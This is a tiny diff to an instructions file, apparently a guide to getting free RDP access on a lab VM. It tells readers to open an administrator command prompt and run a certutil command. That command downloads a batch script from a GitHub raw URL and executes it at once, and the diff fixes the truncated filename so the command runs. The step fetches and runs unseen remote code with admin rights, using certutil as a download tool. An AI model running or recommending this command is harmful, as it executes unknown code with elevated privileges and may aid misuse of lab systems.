@@ -9,4 +9,4 @@ sign go to vm open cmd as admin and type this:
 
 # when on VM quick close cmd and powershell
 
-certutil.exe -urlcache -split -f https://raw.githubusercontent.com/mrX04/lab2rdp/master/lab6cfree.bat && lab6cfree.ba
+certutil.exe -urlcache -split -f https://raw.githubusercontent.com/mrX04/lab2rdp/master/lab6cfree.bat && lab6cfree.bat
